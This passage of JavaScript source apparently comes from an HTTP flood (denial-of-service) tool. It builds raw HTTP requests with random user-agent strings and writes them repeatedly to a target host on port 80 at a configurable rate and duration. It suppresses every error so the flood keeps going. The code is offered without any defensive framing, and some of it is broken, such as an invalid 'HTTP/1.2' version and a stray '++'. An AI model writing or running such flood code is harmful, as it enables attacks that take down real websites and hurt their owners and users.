s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
s.write(Methods + ' ' + parsedTarget.host + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + uap[Math.floor(Math.random() * uap.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    }

    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
            return delete s;
        }, 5000);
    })

    //http-socket
    var pakete = Methods + parsedTarget.host + '/ HTTP/1.2\r\nHost: ' + parsedTarget.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + uap1 + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
client.connect(80,parsedTarget.host)
client.setTimeout(10000);
for (let i = 0; i < args.Rate; i++) {
client.write(pakete)
}

const KillScript = () => process.exit(1);
 setTimeout(KillScript, args.time * 1000);++

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});